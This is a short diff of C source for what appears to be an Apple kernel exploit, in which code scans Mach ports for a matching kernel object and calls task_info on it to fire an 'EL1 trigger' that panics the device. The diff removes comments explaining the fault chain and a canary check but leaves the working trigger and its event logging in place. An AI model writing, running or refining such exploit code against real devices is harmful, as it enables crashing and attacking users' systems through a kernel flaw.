@@ -65,20 +65,10 @@ static void fire_el1_trigger(mach_port_t port, int idx, natural_t kotype,
                              mach_vm_address_t kobject) {
     ev("EL1_TRIGGER_SENT port=%d kotype=%u kobject=0x%016llx sending task_info",
        idx, kotype, (unsigned long long)kobject);
-    /*
-     * task_info() sends a Mach message to the task port. The kernel dispatches
-     * via ipc_kobject_server() at EL1 (IKOT_TASK=2, no thread->recover set).
-     * The MIG stub calls convert_port_to_task() -> ip_kobject as task_t ->
-     * task_info(0x0000000FFFFFC330,...) -> task_lock -> EL1 LDR from TTBR0 VA
-     * -> PAN/translation fault -> kernel panic.
-     * X0/X19 = COMMPAGE_TARGET will appear in the kernel panic register dump.
-     */
     task_basic_info_data_t info;
     mach_msg_type_number_t count = TASK_BASIC_INFO_COUNT;
-    /* This call will cause a kernel panic — it will not return. */
     kern_return_t kr = task_info((task_t)port, TASK_BASIC_INFO,
                                  (task_info_t)&info, &count);
-    /* Should never reach here; log if it does (unexpected recovery) */
     ev("EL1_TRIGGER_RETURNED_UNEXPECTED kr=%d count=%u", kr, count);
 }
 
@@ -96,7 +86,6 @@ static void scan_background(void) {
                 ev("QUALIFYING_HIT port=%d kotype=%u kobject=0x%016llx -> EL1 trigger",
                    i, kotype, (unsigned long long)kobject);
                 fire_el1_trigger(g_ports[i], i, kotype, kobject);
-                /* No return from fire_el1_trigger (device panics) */
             } else {
                 ev("KOBJECT_MATCH_WRONG_KOTYPE port=%d kotype=%u kobject=0x%016llx",
                    i, kotype, (unsigned long long)kobject);
@@ -109,7 +98,6 @@ static void scan_background(void) {
                i, kotype, (unsigned long long)kobject);
         }
     }
-    /* ICMPv6 canary check */
     for (int i = 0; i < g_sock_count; i++) {
         if (g_found) break;
         unsigned char out[32]; socklen_t flen = 32;
